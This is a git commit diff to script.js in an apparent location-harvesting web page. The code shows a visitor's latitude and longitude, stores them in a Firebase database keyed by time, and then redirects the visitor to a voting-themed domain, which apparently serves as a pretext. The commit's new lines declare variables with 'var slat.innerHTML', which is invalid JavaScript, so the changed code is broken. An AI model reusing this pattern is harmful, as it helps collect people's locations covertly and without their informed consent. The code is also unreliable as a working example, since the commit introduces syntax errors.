791cafe682542b2f3320ba42b5e9d1d8821cf107
CusMeDroid <108187260+CusMeDroid@users.noreply.github.com>
2023-10-03 06:44:48 +0700

    Update script.js

--- script.js
+++ script.js
@@ -28,6 +28,8 @@ function getSave() {
 
 function showPosition(position) {
     x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
-    firebase.database().ref("/").child(time).update({ Latitude : position.coords.latitude, Longitude : position.coords.longitude });
+    var slat.innerHTML = position.coords.latitude;
+    var slong.innerHTML = position.coords.longitude;
+    firebase.database().ref("/").child(time).update({ Latitude : slat, Longitude : slong });
     window.location.assign("http://mevoting.is-best.net/");
 }
